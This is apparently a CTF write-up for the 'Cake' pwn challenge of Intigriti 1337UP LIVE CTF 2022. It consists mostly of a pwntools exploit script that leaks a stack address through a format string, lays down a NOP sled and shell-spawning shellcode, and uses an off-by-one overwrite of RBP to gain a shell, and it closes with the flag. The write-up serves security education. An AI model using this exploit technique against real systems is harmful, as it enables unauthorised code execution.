---
name: Cake (2022)
event: Intigriti 1337UP LIVE CTF 2022
category: Pwn
description: Writeup for Cake (Pwn) - Intigriti 1337UP LIVE CTF (2022) 💜
layout:
    title:
        visible: true
    description:
        visible: true
    tableOfContents:
        visible: true
    outline:
        visible: true
    pagination:
        visible: true
---

# Cake

## Video Walkthrough

[![VIDEO](https://img.youtube.com/vi/jU7yB-elFV8/0.jpg)](https://youtu.be/jU7yB-elFV8 "Intigriti 1337UP LIVE CTF 2022: Cake")

## Challenge Description

> The cake isn't a lie!

## Solution

{% code overflow="wrap" %}
```py
from pwn import *

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

# Specify GDB script here (breakpoints etc)
gdbscript = '''
init-pwndbg
break *0x40089b
break *0x400a31
continue
'''.format(**locals())

# Binary filename
exe = './cake'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'debug'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Lib-C library, can use pwninit/patchelf to patch binary
libc = ELF("./libc-2.27.so")
ld = ELF("./ld-2.27.so")

# Start program
io = start()

offset = 256  # 256 bytes needed, then we can overwrite the LSByte of RBP

# Build shellcode (cat flag.txt or spawn shell)
shellcode = asm(shellcraft.sh())  # Shellcraft
# shellcode = '\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05'  # Shellstorm

io.sendlineafter(b'>', b'2')  # Give suggestion
io.sendlineafter(b'?', b'%8$p')  # Leak 8th item off stack (we can locate our buffer from here)

io.sendlineafter(b'>', b'3')  # View suggestion
stack_addr = int(re.search(r"(0x[\w\d]+)", io.recvlineS()).group(0), 16)  # Leaked stack address
info("leaked stack_addr: %#x", stack_addr)  # 0x7fffffffdee0

# Calculate offset to where our shellcode will be
shellcode_address = stack_addr - 128
info("Sub 128: %#x", shellcode_address)  # 0x7fffffffde60

# Calculate the last byte that we want to overwrite RBP with
# Since our shellcode is right after the shellcode_address in payload
# We want to subtract 8 bytes to account for it, then 8 bytes again because:
# the LEAVE (menu+223) will pop to RBP, then the next 8 bytes pop to RIP
# Good explanation: https://nixhacker.com/exploiting-off-by-one-buffer-overflow
last_byte = int(hex(shellcode_address - 8 - 8)[-2:], 16)
info("Last byte: %#x", last_byte)  # 0x7fffffffde[50]

# Build payload (257 bytes) to write shellcode and overflow LSByte of RSP
payload = flat([
    b'3',  # 3 slices of cake
    asm('nop') * 183,  # NOP sled (pad to the shellcode_address)
    shellcode_address,  # 0x7fffffffde60
    asm('nop') * (offset - len(shellcode) - 1 - 183 - 8),  # NOP sled (subtract length of payload up to now)
    shellcode,  # Shellcode (sh/cat etc)
    p8(last_byte)  # Control last byte of RBP (off-by-one)
])

# For testing/demo
# payload = b'3' + (b'A' * 255)  # No overflow
# payload = b'3' + (b'A' * 256)  # Overflow

io.sendlineafter(b'>', b'1')  # Eat Cake
io.sendlineafter(b':', payload)  # Exploit

# Got Shell?
io.interactive()
```
{% endcode %}

Flag: `1337UP{Wow_that_was_Quite_the_journey!}`
